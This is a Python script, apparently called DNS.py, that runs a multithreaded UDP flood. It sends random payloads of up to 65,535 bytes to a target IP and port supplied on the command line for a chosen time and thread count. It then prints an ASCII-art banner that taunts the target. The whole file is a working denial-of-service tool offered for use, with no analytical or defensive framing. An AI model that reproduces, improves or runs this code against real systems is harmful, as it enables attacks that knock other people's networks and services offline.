from time import time as tt
import socket
import random
import os
import sys
import threading

def send_packets(ip, port, time, packet_size):
    startup = tt()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        try:
            nulled = b""
            data = random._urandom(int(random.randint(500, 1024)))
            data2 = random._urandom(int(random.randint(1025, 65535)))
            data3 = os.urandom(int(random.randint(1025, 65535)))
            data4 = random._urandom(int(random.randint(1, 65535)))
            data5 = os.urandom(int(random.randint(1, 65535)))

            endtime = tt()
            if (startup + time) < endtime:
                break

            for x in range(packet_size):
                sock.sendto(nulled, (ip, port))
                sock.sendto(data, (ip, port))
                sock.sendto(data2, (ip, port))
                sock.sendto(data3, (ip, port))
                sock.sendto(data4, (ip, port))
                sock.sendto(data5, (ip, port))
        except:
            pass
        
def attack(ip, port, time, packet_size, threads):
    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))

    for _ in range(threads):
        th = threading.Thread(target=send_packets, args=(ip, port, time, packet_size))
        th.start()

    (banner) = f'''\033[1m\033[32m
                                                                                            
                              ██                          ██                            
                              ██                          ██                            
                            ██  ██                      ██  ██                          
                            ██  ██                      ██  ██                          
                            ██  ██                      ██  ██                          
                          ██      ██                  ██      ██                        
                          ██      ██                  ██      ██                        
                          ██  ████████              ████████  ██                        
                          ████  ██  ░░████      ████░░  ██  ████                        
                        ██  ██░░░░░░▒▒▒▒▓▓██████▓▓▓▓▓▓░░░░░░██  ██                      
                      ██  ░░░░▓▓  ▒▒  ▓▓░░▓▓▓▓▓▓░░▒▒  ▒▒  ▓▓░░░░  ██                    
                      ██░░▒▒▒▒▒▒▒▒▒▒▒▒  ▓▓░░▒▒░░▒▒  ▒▒▒▒▒▒▒▒▒▒▒▒░░██                    
                    ██░░▓▓▒▒██████████▒▒▓▓░░▒▒░░▓▓▒▒██████████▒▒▓▓░░██                  
                    ██▓▓▓▓▒▒████░░░░░░██▒▒▒▒░░▒▒▒▒██░░░░░░████▒▒▓▓▒▒██                  
                  ██  ██▓▓▒▒██░░  ░░  ░░██▒▒▒▒▒▒██░░  ░░  ░░██▒▒▓▓██  ██                
                ██  ░░██▒▒▒▒██░░░░██░░░░██▒▒▓▓▒▒██░░░░██░░░░██▒▒▓▓██░░  ██              
              ██  ░░░░░░██▒▒██░░  ░░  ░░██▒▒▓▓▒▒██░░  ░░  ░░██▒▒██░░░░░░  ██            
            ██  ░░░░████████▒▒██░░░░░░████▒▒▒▒▒▒████░░░░░░██▒▒████████░░░░  ██          
            ████████████▓▓▒▒██▒▒██████████▒▒▒▒▒▒██████████▒▒██▒▒▓▓██  ████████          
                    ██▓▓▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▓▓██                  
                  ██▒▒▒▒██████░░██▓▓░░░░░░▒▒▒▒▒▒░░░░░░▓▓██░░██████▒▒▒▒██                
                  ██████████░░░░░░██▓▓░░░░░░▒▒░░░░░░▓▓██░░░░░░██████████                
                        ██░░░░████████░░░░▓▓▒▒▒▒░░░░████████░░░░██                      
                        ██████████░░░░██▓▓▒▒▒▒▒▒▓▓██░░░░██████████                      
                              ██░░░░██████▒▒▒▒▒▒██████░░░░██                            
                              ██████      ██▒▒██      ██████                            
                                            ██          
    Attack Succesfully Sent to 

    IP: {ip}
    PORT: {port}
    TIME: {time}
    PACKETS: {packet_size}
    THREADS: {threads}

    HAHAHA {ip} SUCH LOSER!
    GET ATTACKED WITH SIZE {packet_size} PACKETS
'''
    print(banner)

if __name__ == '__main__':
    if len(sys.argv) != 6:
        print('Usage: python DNS.py <ip> <port> <time> <packet_size> <threads>')
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    time = int(sys.argv[3])
    packet_size = int(sys.argv[4])
    threads = int(sys.argv[5])

    try:
        attack(ip, port, time, packet_size, threads)
    except KeyboardInterrupt:
        print('Attack stopped.')
